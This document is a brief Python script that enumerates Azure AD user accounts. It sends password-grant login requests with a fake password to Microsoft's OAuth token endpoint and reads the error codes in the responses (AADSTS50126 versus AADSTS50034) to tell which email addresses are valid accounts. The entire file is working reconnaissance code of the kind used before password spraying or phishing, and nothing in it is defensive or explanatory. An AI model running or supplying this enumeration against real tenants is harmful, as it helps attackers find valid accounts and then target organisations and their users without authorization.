import requests

# List of emails for enumeration
emails = [
    "invaliduser@email.com",  # Example test email
]

# Azure AD Authentication URL
url = "https://login.windows.net/tenant-id-here/oauth2/token"

# Client ID and dummy data for the POST request
data = {
    "resource": "https://graph.windows.net",
    "client_id": "dummy",
    "grant_type": "password",
    "username": "",  # This will be populated with each email
    "password": "FakePassword123!",  # Dummy password
}

# Loop through the list of emails
for email in emails:
    data["username"] = email  # Set the username to the current email
    response = requests.post(url, data=data)  # Make the request

    if response.status_code == 400:
        error_data = response.json()
        error_code = error_data.get("error_codes", [])[0]

        if error_code == 50126:
            print(f"\U0001F7E2 [VALID] User exists but password is incorrect: {email} (Error: AADSTS50126)")
        elif error_code == 50034:
            print(f"\U0001F534 [INVALID] User does not exist: {email} (Error: AADSTS50034)")
        else:
            print(f"\U0001F7E1 [UNKNOWN] Unexpected error for {email}: {error_data.get('error_description')}")
    else:
        print(f"\U0001F6A8 [ERROR] Unexpected response for {email}: {response.status_code} - {response.text}")
